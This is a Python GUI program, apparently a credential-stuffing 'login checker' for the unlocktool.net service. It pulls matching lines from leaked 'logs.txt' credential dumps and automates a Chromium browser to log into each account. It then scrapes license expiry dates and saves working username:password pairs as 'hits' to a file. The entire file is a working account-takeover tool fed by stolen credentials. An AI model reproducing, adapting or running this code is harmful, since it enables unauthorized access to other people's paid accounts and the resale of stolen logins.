import tkinter as tk
from tkinter import scrolledtext
from DrissionPage import ChromiumPage, ChromiumOptions
import os, time, re, threading, webbrowser

# ==========================================================
# PAINEL-LOGIN-CHECKER - DEVELOPED BY MAGRIN 
# VERSÃO: 4.9 GOLD | RESTAURADA
# ==========================================================

class MultiTool:
    def __init__(self, root):
        self.root = root
        self.root.title("CHECKER-LOGIN-UnlockTool - DEVELOPED BY MAGRIN")
        self.root.geometry("750x920")
        self.root.configure(bg="#000")
        self.running = False
        self.sucessos = 0
        self.restantes = 0

        # --- TÍTULO PRINCIPAL ---
        tk.Label(root, text="CHECKER-LOGIN-UnlockTool", font=("Impact", 32), bg="#000", fg="#0F0").pack(pady=10)
        tk.Label(root, text="Developed by Magrin", font=("Consolas", 12, "italic"), bg="#000", fg="#FFF").pack()

        # --- SEÇÃO 1: EXTRAIR LOGIN ---
        frame_filter = tk.LabelFrame(root, text=" 📂 Extrair Login ", fg="#0F0", bg="#000", font=("Arial", 11, "bold"), padx=10, pady=10, bd=2)
        frame_filter.pack(fill="x", padx=30, pady=15)
        
        self.btn_filter = tk.Button(frame_filter, text="🚀 FILTRAR LOGS.TXT", command=self.start_filter, 
                                   bg="#111", fg="#0F0", font=("Arial", 11, "bold"), width=45, height=2, relief="flat")
        self.btn_filter.pack(pady=10)

        # --- SEÇÃO 2: LOGIN CHECK 2026+ ---
        frame_check = tk.LabelFrame(root, text=" 🔍 Login Check  ", fg="#0F0", bg="#000", font=("Arial", 11, "bold"), padx=10, pady=10, bd=2)
        frame_check.pack(fill="both", expand=True, padx=30, pady=10)

        stats_frame = tk.Frame(frame_check, bg="#111")
        stats_frame.pack(fill="x", pady=5)
        
        self.lbl_stats = tk.Label(stats_frame, text="SUCESSO   0", font=("Consolas", 12, "bold"), bg="#111", fg="#0F0")
        self.lbl_stats.pack(side="left", padx=20, pady=8)
        
        self.lbl_restante = tk.Label(stats_frame, text="FALTA TESTAR  0", font=("Consolas", 12, "bold"), bg="#111", fg="#FFF")
        self.lbl_restante.pack(side="right", padx=20, pady=8)

        self.txt_log = scrolledtext.ScrolledText(frame_check, width=70, height=15, bg="#000", fg="#0F0", 
                                                font=("Consolas", 10), borderwidth=0, highlightthickness=1, highlightbackground="#333")
        self.txt_log.pack(pady=5, padx=5)
        
        self.txt_log.tag_config("erro", foreground="#FF3333")
        self.txt_log.tag_config("hit", foreground="#00FF00", font=("Consolas", 10, "bold"))
        self.txt_log.tag_config("info", foreground="#FFFFFF")

        btn_frame = tk.Frame(frame_check, bg="#000")
        btn_frame.pack(pady=10)

        self.btn_start = tk.Button(btn_frame, text="INICIAR SCAN", command=self.start_check, 
                                  bg="#0F0", fg="#000", font=("Arial", 13, "bold"), width=20, height=2)
        self.btn_start.grid(row=0, column=0, padx=10)

        self.btn_stop = tk.Button(btn_frame, text="PARAR TUDO", command=self.stop_check, 
                                 bg="#900", fg="#FFF", font=("Arial", 13, "bold"), width=20, height=2)
        self.btn_stop.grid(row=0, column=1, padx=10)

        self.btn_insta = tk.Button(frame_check, text=" CREDITOS", command=self.open_insta,
                                  bg="#0026FF", fg="#FFF", font=("Arial", 10, "bold"), width=30, height=1, relief="flat")
        self.btn_insta.pack(pady=10)
        
        self.log("==========================================================", "info")
        self.log("      PAINEL-LOGIN-CHECKER - DEVELOPED BY MAGRIN", "info")
        self.log("==========================================================", "info")

    def open_insta(self):
        webbrowser.open("https://www.instagram.com/magrin.1")

    def log(self, msg, tag="info"):
        self.txt_log.insert(tk.END, f" {msg}\n", tag)
        self.txt_log.see(tk.END)

    def filter_worker(self):
        self.btn_filter.config(state=tk.DISABLED, text="⚙️ EXTRAINDO...")
        try:
            if not os.path.exists('logs.txt'):
                self.log("❌ Erro: Arquivo 'logs.txt' não encontrado.", "erro")
                return
            count = 0
            with open('logs.txt', 'r', encoding='utf-8', errors='ignore') as f_in, \
                 open('log.txt', 'w', encoding='utf-8') as f_out:
                for linha in f_in:
                    if 'unlocktool.net' in linha.lower():
                        f_out.write(linha)
                        count += 1
            self.log(f"✅ Extração Concluída! {count} logins prontos.", "info")
        finally:
            self.btn_filter.config(state=tk.NORMAL, text="🚀 FILTRAR LOGS.TXT")

    def start_filter(self):
        threading.Thread(target=self.filter_worker, daemon=True).start()

    def stop_check(self):
        self.running = False

    def check_worker(self):
        self.running = True
        self.sucessos = 0
        co = ChromiumOptions().incognito(True)
        
        try:
            page = ChromiumPage(co)
            if not os.path.exists('log.txt'):
                self.log("❌ Erro: Extraia primeiro!", "erro")
                return

            with open('log.txt', 'r', encoding='utf-8', errors='ignore') as f:
                linhas = [l.strip() for l in f.readlines() if ':' in l]

            total_contas = len(linhas)
            for i, linha in enumerate(linhas):
                if not self.running: break
                self.lbl_restante.config(text=f"FALTA TESTAR  {total_contas - i}")
                
                partes = linha.split(':')
                user, senha = partes[-2], partes[-1]
                self.log(f"🔍 Verificando: {user}", "info")

                try:
                    page.get('https://unlocktool.net/post-in/')
                    time.sleep(3)
                    
                    if page.ele('@name=username'):
                        page.ele('@name=username').input(user)
                        page.ele('@name=password').input(senha)
                        page.ele('@type=submit').click()
                        time.sleep(4)

                        if 'post-in' in page.url:
                            self.log(f"❌ Senha Incorreta: {user}", "erro")
                        else:
                            page.get('https://unlocktool.net/profile/')
                            time.sleep(3)
                            
                            btn_lic = page.ele('text=Licenses') or page.ele('@href=#licenses')
                            if btn_lic: 
                                page.run_js('arguments[0].click();', btn_lic)
                                time.sleep(2)
                            
                            datas = re.findall(r'202[6-9]-\d{2}-\d{2}|20[3-9]\d-\d{2}-\d{2}', page.html)
                            
                            if datas:
                                vence = max(datas)
                                self.sucessos += 1
                                self.log(f"💎 HIT TOP! {user} | Exp: {vence}", "hit")
                                with open('Check.txt', 'a') as h:
                                    h.write(f"{user}:{senha} | Vence: {vence}\n")
                                self.lbl_stats.config(text=f"SUCESSO   {self.sucessos}")
                            else:
                                self.log(f"⚠️ {user} - Licença expirada ou antiga.", "info")
                            
                            page.get('https://unlocktool.net/logout/')
                            time.sleep(2)
                except: continue
        finally:
            self.running = False
            self.log("🏁 Scanner Finalizado.", "info")
            self.btn_start.config(state=tk.NORMAL)

    def start_check(self):
        self.btn_start.config(state=tk.DISABLED)
        threading.Thread(target=self.check_worker, daemon=True).start()

if __name__ == "__main__":
    root = tk.Tk()
    app = MultiTool(root)
    root.mainloop()